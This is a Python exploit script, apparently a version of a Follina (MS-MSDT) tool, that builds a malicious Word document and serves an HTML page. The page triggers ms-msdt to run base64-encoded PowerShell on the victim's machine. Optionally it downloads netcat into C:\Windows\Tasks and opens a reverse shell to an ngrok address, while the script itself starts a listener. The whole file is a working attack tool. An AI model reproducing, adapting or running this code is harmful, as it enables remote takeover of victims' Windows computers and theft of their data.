#!/usr/bin/env python3

import argparse
import tempfile
import shutil
import os
import random
import base64
import http.server
import socketserver
import string
import socket
import threading
from termcolor import cprint


cprint("""
  _        _   _                       __                    _            ___,  , _    
 | |      | | | | o                   /\_\/                 (_|   |   |_//   | /|/ \   
 | |  __  | | | |     _  _    __,    |    |      _   ,_       |   |   | |    |  |   |  
 |/  /  \_|/  |/  |  / |/ |  /  |    |    ||  |_|/  /  |      |   |   | |    |  |   |  
 |__/\__/ |__/|__/|_/  |  |_/\_/|_/   \__/  \/  |__/   |_/     \_/ \_/   \__/\_/|   |_/
 |\                                                                                    
 |/                                                                                    
by Blackstorm""", 'green')

parser = argparse.ArgumentParser()



parser.add_argument(
    "--command",
    "-c",
    help="command to run on the target",
    
)

parser.add_argument(
    "--output",
    "-o",
    default="./follina.doc",
    help="output maldoc file",
    
)

parser.add_argument(
    "--url",
    "-u",
    required=True,
    help="Provide ngrok webserver link",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    help="Provide ngrok tcp reverse port",
)

parser.add_argument(
    "--ip",
    "-i",
    help="provide ngrok tcp address",
)

port = 80
reverse  = 1337
def main(args):
    serve_host = args.url
    # Copy the Microsoft Word skeleton into a temporary staging folder
    doc_suffix = "doc"
    staging_dir = os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
    )
    doc_path = os.path.join(staging_dir, doc_suffix)
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
    print(f"[+] copied staging doc {staging_dir}")

    # Prepare a temporary HTTP server location
    serve_path = os.path.join(staging_dir, "www")
    os.makedirs(serve_path)

    # Modify the Word skeleton to include our HTTP server
    document_rels_path = os.path.join(
        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )

    with open(document_rels_path) as filp:
        external_referral = filp.read()

    external_referral = external_referral.replace(
        # "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
        "{staged_html}", f"{serve_host}/index.html"

    )

    with open(document_rels_path, "w") as filp:
        filp.write(external_referral)

    # Rebuild the original office file
    shutil.make_archive(args.output, "zip", doc_path)
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")

    command = args.command
    if args.port:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {args.ip} {args.port}"""

    # Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )

    # Create our HTML endpoint
    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    class ReuseTCPServer(socketserver.TCPServer):
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(self.server_address)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_path, **kwargs)

        def log_message(self, format, *func_args):
            if args.port:
                return
            else:
                super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            if args.port:
                return
            else:
                super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", port), Handler) as httpd:
            httpd.serve_forever()

    # Host the HTTP server on all interfaces
    print(f"[+] serving html payload on :{port}")
    if args.port:
        t = threading.Thread(target=serve_http, args=())
        t.start()
        print(f"[+] starting 'nc -lvnp {reverse}' ")
        os.system(f"nc -lnvp {reverse}")

    else:
        serve_http()


if __name__ == "__main__":

    main(parser.parse_args())
